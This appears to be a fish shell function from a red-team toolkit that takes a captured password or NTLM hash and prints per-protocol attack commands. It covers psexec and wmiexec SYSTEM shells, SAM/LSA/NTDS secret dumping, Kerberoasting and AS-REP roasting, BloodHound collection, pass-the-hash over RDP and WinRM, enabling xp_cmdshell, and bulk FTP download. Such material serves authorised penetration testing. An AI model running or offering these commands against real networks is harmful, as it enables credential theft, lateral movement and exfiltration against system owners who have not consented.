function __cred_guide --description "per-protocol what-to-do-with-a-credential playbook, do not call directly"
    # args: PROTO IP DOMAIN USER SECRET SFLAG   (SFLAG is -p for a password, -H for an NTLM hash)
    # Prints command templates for a service you now have a working credential on,
    # most useful line first. Sources: HackTricks and Hacking Articles per-service pages.
    set -l proto $argv[1]
    set -l ip $argv[2]
    set -l dom $argv[3]
    set -l user $argv[4]
    set -l sec $argv[5]
    set -l sflag $argv[6]

    set -l hash 0
    test "$sflag" = -H; and set hash 1

    # ssh/ftp/vnc never take an NTLM hash, say so instead of printing nonsense
    if test $hash -eq 1; and contains -- $proto ssh ftp vnc
        echo "$proto is password-only; an NTLM hash does not apply here"
        return 0
    end

    # impacket principal: DOMAIN/USER, or bare USER when the domain is unknown/local
    set -l prin $user
    test -n "$dom" -a "$dom" != DOMAIN; and set prin "$dom/$user"

    # two hash shapes: NT alone (evil-winrm -H, xfreerdp /pth) and LM:NT (impacket -hashes)
    set -l nt $sec
    set -l imp $sec
    if test $hash -eq 1
        if string match -q '*:*' -- $sec
            set nt (string split ':' -- $sec)[-1]
        else
            set imp ":$sec"
        end
    end

    # how the secret rides on nxc-style -p/-H tools, and on impacket user@host
    set -l pw "-p '$sec'"
    set -l impcred "$prin:'$sec'@$ip"
    if test $hash -eq 1
        set pw "-H $nt"
        set impcred "$prin@$ip -hashes $imp"
    end

    switch $proto
        case smb
            echo "nxc smb $ip -u $user $pw --shares            # shares; (Pwn3d!) = local admin"
            echo "impacket-psexec $impcred                     # SYSTEM shell, needs admin"
            echo "nxc smb $ip -u $user $pw --sam --lsa         # dump local secrets (admin; --ntds on a DC)"
            echo "smbclient -U '$dom\\$user' //$ip/SHARE        # browse one share by hand"
        case ldap
            set -l lsec "'$sec'"; test $hash -eq 1; and set lsec $nt
            echo "nxclur $ip $user $lsec                        # the merged user roster (this toolkit)"
            echo "nxc ldap $ip -u $user $pw --asreproast asrep.txt --kerberoasting kerb.txt"
            if test $hash -eq 1
                echo "bloodhound-python -u $user --hashes $imp -d $dom -ns $ip -c all   # attack paths"
            else
                echo "bloodhound-python -u $user -p '$sec' -d $dom -ns $ip -c all        # attack paths"
            end
        case winrm
            echo "evil-winrm -i $ip -u $user $pw               # interactive shell"
        case wmi
            echo "impacket-wmiexec $impcred                    # shell, no service created, needs admin"
            echo "nxc wmi $ip -u $user $pw -x whoami           # one-shot command"
        case mssql
            if test $hash -eq 1
                echo "impacket-mssqlclient $prin@$ip -hashes $imp -windows-auth   # drop -windows-auth for a SQL login"
            else
                echo "impacket-mssqlclient $prin:'$sec'@$ip -windows-auth         # drop -windows-auth for a SQL login"
            end
            echo "    then: enable_xp_cmdshell; xp_cmdshell whoami"
            echo "nxc mssql $ip -u $user $pw -M enum_impersonate               # can you EXECUTE AS sa?"
        case ssh
            echo "ssh $user@$ip                                 # password auth, nxc already proved it"
        case ftp
            echo "ftp $ip                                       # log in $user / the password"
            echo "wget -r --user=$user --password='$sec' ftp://$ip/   # pull everything"
        case rdp
            if test $hash -eq 1
                echo "xfreerdp /u:$user /pth:$nt /v:$ip +clipboard /cert:ignore          # restricted-admin PtH"
            else
                echo "xfreerdp /u:$user /p:'$sec' /v:$ip +clipboard /cert:ignore /dynamic-resolution"
            end
        case vnc
            echo "vncviewer $ip::5900                           # VNC auth is password-only, no username"
        case '*'
            echo "(no playbook for $proto)"
    end
end